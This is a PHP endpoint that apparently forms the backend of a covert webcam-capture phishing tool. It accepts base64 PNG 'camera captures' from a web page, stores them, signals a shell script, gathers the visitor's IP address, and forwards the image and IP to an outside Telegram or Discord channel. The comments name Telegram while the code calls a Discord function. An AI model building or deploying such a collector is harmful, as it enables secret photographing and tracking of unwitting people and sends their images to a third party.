<?php

header('Content-Type: application/json; charset=UTF-8');
header('X-Content-Type-Options: nosniff');
header('Cache-Control: no-store, no-cache, must-revalidate');

/* ── Telegram Webhook Integration ────────────────────────────── */
if (!defined('TELEGRAM_BOT_TOKEN') || !defined('TELEGRAM_CHAT_ID')) {
    require_once __DIR__ . '/../core/telegram_webhook.php';
}

$maxBase64Length = 8 * 1024 * 1024; // Reject oversized payloads before decode.

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    exit;
}

$date = date('Ymd_His') . '_' . substr(bin2hex(random_bytes(3)), 0, 6);
$imageData = $_POST['cat'] ?? '';

if (empty($imageData)) {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => 'No image data']);
    exit;
}

/* ── Central data directory ── */
$data_dir      = dirname(__DIR__) . '/data';
$captures_dir  = $data_dir . '/camera_captures';

if (!is_dir($data_dir)) {
    mkdir($data_dir, 0750, true);
}
if (!is_dir($captures_dir)) {
    mkdir($captures_dir, 0750, true);
}

/* Validate and extract base64 payload */
$imageData = trim((string) $imageData);
$isExpectedPrefix = strpos($imageData, 'data:image/png;base64,') === 0
    || strpos($imageData, 'data:image/octet-stream;base64,') === 0;

if (!$isExpectedPrefix) {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => 'Unsupported image format']);
    exit;
}

$commaPos = strpos($imageData, ',');
if ($commaPos === false) {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => 'Invalid image format']);
    exit;
}

$filteredData  = substr($imageData, $commaPos + 1);
if ($filteredData === '' || strlen($filteredData) > $maxBase64Length) {
    http_response_code(413);
    echo json_encode(['status' => 'error', 'message' => 'Image payload too large']);
    exit;
}

$unencodedData = base64_decode($filteredData, true);

if ($unencodedData === false) {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => 'Invalid base64 data']);
    exit;
}

if (substr($unencodedData, 0, 8) !== "\x89PNG\r\n\x1a\n") {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => 'Invalid PNG data']);
    exit;
}

$filepath = $captures_dir . '/cam' . $date . '.png';
$fp = fopen($filepath, 'wb');
if (!$fp) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Unable to save image']);
    exit;
}

flock($fp, LOCK_EX);
$written = fwrite($fp, $unencodedData);
flock($fp, LOCK_UN);
fclose($fp);

if ($written === false || $written < strlen($unencodedData)) {
    @unlink($filepath);
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Unable to save image']);
    exit;
}

@chmod($filepath, 0640);

/* ── Signal shell script that a new capture arrived ── */
file_put_contents($data_dir . '/.flag_cam', $filepath);

/* ── Telegram: Upload the actual camera image ── */
$imageSent = false;
if (file_exists($filepath)) {
    // sendTelegramImage uses multipart/form-data to upload the file directly.
    $client_ip = 'Unknown';
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_TRUE_CLIENT_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR'] as $h) {
        if (!empty($_SERVER[$h])) {
            $parts = explode(',', $_SERVER[$h]);
            $cand = trim($parts[0]);
            if (filter_var($cand, FILTER_VALIDATE_IP)) {
                $client_ip = $cand;
                break;
            }
        }
    }
}
if ($client_ip === 'Unknown') {
    $client_ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}
$timestamp = date('Y-m-d H:i:s T');
sendDiscordImage(
    $filepath,
    '📸 **Camera Capture** -- ' . $timestamp . "\nIP: `" . $client_ip . '`'
);

echo json_encode(['status' => 'success']);
exit;

